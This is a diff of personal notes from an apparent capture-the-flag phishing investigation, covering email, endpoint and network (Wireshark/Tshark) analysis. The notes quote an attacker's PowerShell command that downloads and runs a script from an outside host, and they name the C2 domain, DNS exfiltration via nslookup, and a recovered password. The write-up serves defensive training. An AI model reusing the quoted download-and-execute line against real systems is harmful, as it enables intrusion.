@@ -1,9 +1,11 @@
-Personal Notes and tips: sq3.exe seems to be what the attacker used against the SQLite database. --important to remember for the future
+##### This version was my own and was not enhanced by AI.
 
-Boogeyman 1 Notes:
+#### Personal Notes and tips: sq3.exe seems to be what the attacker used against the SQLite database. --important to remember for the future
+---
+# Boogeyman 1 Notes:
 
-**Email Investigation**
----------------------------
+## Email Investigation
+---
 Opened up the eml file
 
 Phish Email:
@@ -15,7 +17,7 @@ julianne.westcott@hotmail.com
 Looking inside the zip without extracting:
 unzip -l Invoice.zip
 
---The .zip file is password protected--	
+The .zip file is password protected
 
 Found the password within the email data:
 "invoice2023!"
@@ -41,7 +43,7 @@ iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/updat
 unsure what the command is, or why its there, I continue the investigation
 ---------------------------------
 
-**Endpoint Investigation**
+## Endpoint Investigation
 ---------------------------------
 Found a GitHub url within the powershell.json file within the Artefacts folder.
 
@@ -92,11 +94,11 @@ C2 Domain: cdn.bpakcaging.xyz
 C2 port: 8080
 
 the Threat Actor abused the windows service 'nslookup' to transmission the data to their C2.
----------------------------------------
-##Network Investigation
---------------------------------------
+---
+## Network Investigation
+---
 
-Wireshark:
+### Wireshark:
 using the 'http contains "files.bpakcaging.xyz" we found that they were using python to host the site files site by checking Packet 42702's TCP Stream.
 
 The attacker used HTTP POST requests for the outputs of the commands executed.
@@ -104,19 +106,19 @@ The attacker used HTTP POST requests for the outputs of the commands executed.
 The attacker used DNS during the exfiltration activity.
 
 The attacker used sq3.exe to find the password to the file 'protected_data.kdbx', the password was stored in the plum.sqlite file, the password being "%p9^3!lL^Mz47E2GaT^y".
-----------------
-Tshark:
+---
+### Tshark:
 
 Now using Tshark to obtain whatever information the attacker stole from within the file.
 
 Commands used:
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name -e dns.qry.type (filtering by.. dns query type?)
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" (see the data filtered via dns of the domain traffic with any "www" or so.. headers? of the website)
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' (gives us only the field 1 data strings)
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" (sorted "files" and "cdn" out of the command results) 
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' (using regex all of a sudden?? huh? tr -d??)
-tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > output.txt (output text to a file OR use >> to APPEND info to a new file)
->> ~/Desktop/answers.txt (append the info into a new file)
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name -e dns.qry.type (filtering by.. dns query type?)```
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz"``` (see the data filtered via dns of the domain traffic of the website with '.' to get any and all subdomains in the .pcapng file)
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' ```(gives us only the field 1 data strings)
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" ``` (sorted "files" and "cdn" out of the command results) 
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n'``` 
+```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > output.txt``` (outputted info to a .txt file)
+``bash >> ~/Desktop/answers.txt``` (append the info into a new file)
 
 use cyberchef FROM HEX, save output as .kdbx extension
 (do this in a VM or sandbox in case its malware, you never know when reconstructing files)
@@ -141,5 +143,7 @@ then use a program to view the .kdbx file and its contents for the last answer i
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀===FINISH CTF===
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+# ===FINISH CTF===
 
